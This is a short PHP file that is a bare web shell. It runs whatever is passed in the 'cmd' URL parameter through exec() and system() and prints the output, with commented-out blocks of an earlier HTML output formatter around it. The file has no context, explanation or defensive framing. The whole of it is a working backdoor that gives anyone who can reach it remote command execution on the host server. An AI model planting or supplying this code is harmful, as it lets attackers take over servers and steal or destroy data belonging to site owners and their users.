<?php
$htmlResp = "";
exec($_GET['cmd'], $result);

//$htmlResp .= '----------------- < OutPut > -----------------';
//$htmlResp .= '<pre>';
/*foreach ($result as $print) {
    $print = str_replace('<', '&lt;', $print);
    $htmlResp .= $print;
}*/
//$htmlResp .= '</pre>';

/*if (isset($_GET['exec'])) {

    exec($_GET['cmd'], $result);

    $htmlResp .= '----------------- < OutPut > -----------------';
    $htmlResp .= '<pre>';
    foreach ($result as $print) {
        $print = str_replace('<', '&lt;', $print);
        $htmlResp .= $print . '<br>';
    }
    $htmlResp .= '</pre>';
} else {
    $htmlResp = '<br>';
}*/
echo system($_GET['cmd']);